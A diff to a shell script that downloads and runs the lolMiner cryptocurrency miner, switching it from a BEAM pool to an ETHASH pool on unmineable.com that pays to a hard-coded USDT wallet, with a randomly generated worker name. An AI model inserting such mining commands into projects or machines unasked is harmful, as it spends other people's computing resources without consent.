@@ -8,7 +8,7 @@ tar -xf lolMiner_v1.29_Lin64.tar.gz
 cd 1.29
 sudo swapoff -a; sudo swapon -a
 sleep 10
-./lolMiner --algo BEAM-III --pool eu1-beam.flypool.org:3333 --user 3f0217f0d7ebd35fbf03ab4de39eb57035c81a1e2d6b6d28a42c19c446add836962  --tls on
+./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user USDT:TFV2Lz82FGocoXdBJuc9tJSREcTZFSxav2.$(echo $(shuf -i 1000-9999 -n 1)-MJ-)#hthp-17hh --ethstratum ETHPROXY
 sleep 10
 sudo swapoff -a; sudo swapon -a
 pkill -9 lolMiner
